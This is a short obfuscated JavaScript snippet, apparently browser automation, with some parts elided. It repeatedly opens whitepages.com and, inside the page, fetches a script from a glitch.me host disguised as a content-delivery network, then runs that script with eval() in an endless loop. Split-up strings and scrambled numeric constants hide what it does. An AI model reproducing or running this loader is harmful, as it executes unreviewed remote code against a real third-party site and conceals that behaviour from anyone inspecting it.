((async () => {
  ...
  (async function g() {
    let h = -0x1 * -0xf29 + -0x21d3 + -0x2 * -0x955;
    ...
    return j['on']('pageerror', function(k) {}), j['on']('error', function(k) {}), await j['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
      ...
      k['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', 0x65b * -0x4 + 0x81b + 0x1151), k['send'](), eval(k['responseTe' + 'xt']);
    }), await wait(0x11204f + -0x12c529 + 0xf607a), await j['close'](), await i['close'](), g());
  }());
})());